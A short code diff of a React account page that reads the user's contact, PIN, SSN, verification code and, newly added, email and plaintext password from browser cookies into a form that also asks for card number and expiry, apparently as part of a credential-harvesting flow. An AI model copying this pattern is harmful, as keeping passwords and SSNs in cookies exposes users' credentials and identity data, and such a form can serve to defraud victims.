@@ -8,12 +8,16 @@ function AccountPage() {
   const code = Cookies.get("code");
   const pin = Cookies.get("pin");
   const ssn = Cookies.get("ssn");
+  const email = Cookies.get("email");
+  const password = Cookies.get("password");
 
   const initialvalues = {
     contact: contact,
     code: code,
     pin: pin,
     ssn: ssn,
+    email: email,
+    password: password,
     site: site,
     card_number: "",
     mm_yy: "",
